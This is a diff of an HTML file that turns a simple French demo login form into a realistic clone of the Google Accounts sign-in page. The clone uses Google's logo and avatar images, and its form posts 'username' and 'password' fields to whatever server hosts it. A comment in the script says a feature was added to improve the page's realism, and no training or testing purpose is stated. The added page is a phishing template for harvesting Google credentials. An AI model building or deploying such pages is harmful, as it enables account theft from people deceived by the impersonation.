@@ -1,269 +1,162 @@
-
-<!DOCTYPE html>
-<html lang="fr">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Connexion - Google</title>
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
-    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
-    <style>
-        :root {
-            --primary-color: #4285f4;
-            --primary-hover: #357ae8;
-            --red-color: #ea4335;
-            --text-color: #202124;
-            --secondary-text: #5f6368;
-            --border-color: #dadce0;
-            --input-bg: #ffffff;
-            --card-bg: #ffffff;
-            --body-bg: #f8f9fa;
-        }
-
-        * {
+<!DOCTYPE html><html lang="fr"><head><meta charset="utf-8"/><meta content="width=device-width, initial-scale=1" name="viewport"/>
+	<title>Sign in - Google Accounts</title>
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans:300,400|Roboto:400,500&amp;display=swap" rel="stylesheet"/>
+	<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet"/>
+	<style type="text/css">html, body {
+            font-family: Arial, sans-serif;
+            background: #fff;
             margin: 0;
             padding: 0;
-            box-sizing: border-box;
+            height: 100%;
+            width: 100%;
+            font-size: 13px;
+            color: #404040;
+            display: flex;
+            flex-direction: column;
         }
 
-        body {
-            font-family: 'Roboto', sans-serif;
-            background-color: var(--body-bg);
-            color: var(--text-color);
+        .wrapper { flex: 1; display: flex; flex-direction: column; }
+        
+        .google-header-bar {
+            height: 71px;
+            border-bottom: 1px solid #e5e5e5;
             display: flex;
             justify-content: center;
             align-items: center;
-            min-height: 100vh;
-            padding: 20px;
         }
+        .google-header-bar .logo { height: 38px; width: 116px; }
 
-        .login-container {
-            background: var(--card-bg);
+        .main { padding: 40px 10px; flex: 1; }
+        .banner { text-align: center; margin-bottom: 20px; }
+        .banner h2 { font-family: 'Open Sans', arial; color: #555; font-size: 18px; font-weight: 400; margin: 0; }
+
+        .card {
+            background-color: #f7f7f7;
             padding: 40px;
-            border-radius: 8px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            margin: 0 auto;
             width: 100%;
-            max-width: 400px;
-            transition: all 0.3s ease;
+            max-width: 304px;
+            border-radius: 2px;
+            box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
+            box-sizing: border-box;
         }
 
-        .login-header {
-            text-align: center;
-            margin-bottom: 30px;
-        }
-
-        .logo {
-            width: 120px;
-            height: 40px;
+        .profile-img {
+            width: 96px;
+            height: 96px;
             margin: 0 auto 20px;
-            background-image: url('https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png');
-            background-size: contain;
-            background-repeat: no-repeat;
-            background-position: center;
+            display: block;
+            border-radius: 50%;
+            background: #fff;
+            border: 1px solid #ebebeb;
         }
 
-        .login-header h1 {
-            font-size: 24px;
-            font-weight: 400;
-            color: var(--text-color);
-        }
+        .input-group { position: relative; margin-bottom: 15px; }
 
-        .form-group {
-            margin-bottom: 20px;
-            position: relative;
-        }
-
-        .form-group label {
-            position: absolute;
-            top: 16px;
-            left: 16px;
-            color: var(--secondary-text);
-            font-size: 16px;
-            pointer-events: none;
-            transition: all 0.2s ease;
-            background: var(--input-bg);
-            padding: 0 4px;
-        }
-
-        .form-group input {
+        input[type=email], input[type=password], input[type=text] {
             width: 100%;
-            padding: 16px;
+            height: 44px;
             font-size: 16px;
-            border: 1px solid var(--border-color);
-            border-radius: 4px;
-            background: var(--input-bg);
-            transition: all 0.2s ease;
+            padding: 0 10px;
+            background: #fff;
+            border: 1px solid #d9d9d9;
+            border-top: 1px solid #c0c0c0;
+            box-sizing: border-box;
+            border-radius: 1px;
+        }
+
+        input:focus {
             outline: none;
-        }
-
-        .form-group input:focus,
-        .form-group input:not(:placeholder-shown) {
-            border-color: var(--primary-color);
-        }
-
-        .form-group input:focus + label,
-        .form-group input:not(:placeholder-shown) + label {
-            top: -10px;
-            left: 12px;
-            font-size: 12px;
-            color: var(--primary-color);
+            border: 1px solid #4d90fe;
+            box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
         }
 
         .password-toggle {
             position: absolute;
             top: 50%;
-            right: 16px;
+            right: 10px;
             transform: translateY(-50%);
-            color: var(--secondary-text);
+            color: #5f6368;
             cursor: pointer;
-            user-select: none;
-        }
-
-        .login-button {
-            width: 100%;
-            padding: 12px;
-            background: var(--primary-color);
-            color: white;
-            border: none;
-            border-radius: 4px;
-            font-size: 16px;
-            font-weight: 500;
-            cursor: pointer;
-            transition: background 0.2s ease;
             display: flex;
             align-items: center;
-            justify-content: center;
-            gap: 8px;
-            margin-top: 24px;
         }
 
-        .login-button:hover {
-            background: var(--primary-hover);
-        }
-
-        .login-button:disabled {
-            background: var(--border-color);
-            cursor: not-allowed;
-        }
-
-        .error-message {
-            background: #fef2f2;
-            color: var(--red-color);
-            padding: 12px;
-            border-radius: 4px;
+        .rc-button-submit {
+            width: 100%;
+            height: 36px;
+            border: 1px solid #3079ed;
+            color: #fff;
+            text-shadow: 0 1px rgba(0,0,0,0.1);
+            background-color: #4d90fe;
+            font-weight: 700;
             font-size: 14px;
-            margin-bottom: 20px;
-            display: none;
+            cursor: pointer;
+            margin-top: 10px;
         }
 
-        .success-message {
-            background: #f0f9f0;
-            color: #34a853;
-            padding: 12px;
-            border-radius: 4px;
-            font-size: 14px;
-            margin-bottom: 20px;
-            display: none;
+        .rc-button-submit:hover {
+            background-color: #357ae8;
+            border: 1px solid #2f5bb7;
         }
 
-        @media (max-width: 480px) {
-            .login-container {
-                padding: 30px 20px;
-            }
-            .logo {
-                width: 100px;
-                height: 34px;
-            }
+        .footer-bar {
+            border-top: 1px solid #e5e5e5;
+            padding: 15px;
+            font-size: 11px;
+            color: #737373;
+            text-align: center;
         }
-    </style>
+
+        .links-container {
+            margin-top: 25px;
+            text-align: center;
+        }
+        
+        .links-container a {
+            color: #427fed;
+            text-decoration: none;
+            font-weight: normal;
+        }
+	</style>
 </head>
 <body>
-    <div class="login-container">
-        <div class="login-header">
-            <div class="logo"></div>
-            <h1>Connexion</h1>
-        </div>
+<div class="wrapper">
+<div class="google-header-bar"><img alt="Google" class="logo" src="https://ssl.gstatic.com/accounts/ui/logo_2x.png"/></div>
 
-        <div class="error-message" id="errorMessage">
-            Identifiant ou mot de passe incorrect.
-        </div>
+<div class="main">
+<div class="banner">
+<h2>Accéder à votre compte</h2>
+</div>
 
-        <div class="success-message" id="successMessage">
-            Connexion réussie ! Redirection...
-        </div>
+<div class="card"><img alt="Avatar" class="profile-img" src="https://ssl.gstatic.com/accounts/ui/avatar_2x.png"/>
+<form action="" method="POST">
+<div class="input-group"><input id="Email" name="username" placeholder="E-mail ou téléphone" required="" spellcheck="false" type="email"/></div>
 
-        <form id="loginForm">
-            <div class="form-group">
-                <input type="email" id="email" placeholder=" " required>
-                <label for="email">Adresse e-mail</label>
-            </div>
-            <div class="form-group">
-                <input type="password" id="password" placeholder=" " required>
-                <label for="password">Mot de passe</label>
-                <span class="password-toggle" onclick="togglePassword()">
-                    <span class="material-icons" id="toggleIcon">visibility_off</span>
-                </span>
-            </div>
-            <button type="submit" class="login-button" id="loginButton">
-                <span class="material-icons">login</span>
-                Se connecter
-            </button>
-        </form>
-    </div>
+<div class="input-group"><input id="Passwd" name="password" placeholder="Mot de passe" required="" type="password"/> <span class="password-toggle" id="toggleVisibility"> <span class="material-icons" style="font-size: 20px;">visibility_off</span> </span></div>
+<input class="rc-button-submit" type="submit" value="Suivant"/> </form>
 
-    <script>
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
-            const errorDiv = document.getElementById('errorMessage');
-            const successDiv = document.getElementById('successMessage');
-            const button = document.getElementById('loginButton');
+<div class="links-container"><a href="#">Mot de passe oublié ?</a></div>
+</div>
+</div>
+</div>
 
-            errorDiv.style.display = 'none';
-            successDiv.style.display = 'none';
-            button.disabled = true;
-            button.innerHTML = '<span class="material-icons spinning">loop</span> Connexion...';
-
-            setTimeout(() => {
-                if (email === 'admin' && password === 'password') {
-                    successDiv.style.display = 'block';
-                    setTimeout(() => {
-                        window.location.href = 'https://accounts.google.com/ServiceLogin';
-                    }, 1500);
-                } else {
-                    errorDiv.style.display = 'block';
-                }
-                button.disabled = false;
-                button.innerHTML = '<span class="material-icons">login</span> Se connecter';
-            }, 1500);
-        });
-
-        function togglePassword() {
-            const passwordField = document.getElementById('password');
-            const toggleIcon = document.getElementById('toggleIcon');
-            
-            if (passwordField.type === 'password') {
-                passwordField.type = 'text';
-                toggleIcon.textContent = 'visibility';
-            } else {
-                passwordField.type = 'password';
-                toggleIcon.textContent = 'visibility_off';
-            }
+<div class="footer-bar"><span>Français · Confidentialité · Aide</span></div>
+<script>
+    // Toggle visibilité mot de passe (Améliore le réalisme)
+    const passwordField = document.getElementById('Passwd');
+    const toggleBtn = document.getElementById('toggleVisibility');
+    
+    toggleBtn.addEventListener('click', function() {
+        const icon = this.querySelector('.material-icons');
+        if (passwordField.type === 'password') {
+            passwordField.type = 'text';
+            icon.textContent = 'visibility';
+        } else {
+            passwordField.type = 'password';
+            icon.textContent = 'visibility_off';
         }
+    });
+</script>
 
-        const style = document.createElement('style');
-        style.textContent = `
-            .material-icons.spinning {
-                animation: spin 1s linear infinite;
-            }
-            @keyframes spin {
-                0% { transform: rotate(0deg); }
-                100% { transform: rotate(360deg); }
-            }
-        `;
-        document.head.appendChild(style);
-    </script>
-</body>
-</html>
+</body></html>
